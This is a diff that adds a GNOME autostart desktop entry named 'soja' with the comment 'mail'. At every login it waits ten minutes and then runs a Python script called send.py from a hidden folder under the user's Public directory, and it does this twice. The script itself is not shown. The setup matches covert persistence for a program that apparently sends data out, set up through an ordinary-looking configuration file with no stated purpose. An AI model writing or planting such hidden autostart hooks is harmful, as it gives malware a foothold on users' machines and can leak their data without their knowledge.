@@ -1,0 +1,10 @@
+[Desktop Entry]
+Type=Application
+Exec=sleep 600; python /home/user/Public/.fol/send.py; sleep 600; python /home/user/Public/.fol/send.py
+Hidden=false
+NoDisplay=false
+X-GNOME-Autostart-enabled=true
+Name[en_IN]=soja
+Name=soja
+Comment[en_IN]=mail
+Comment=mail
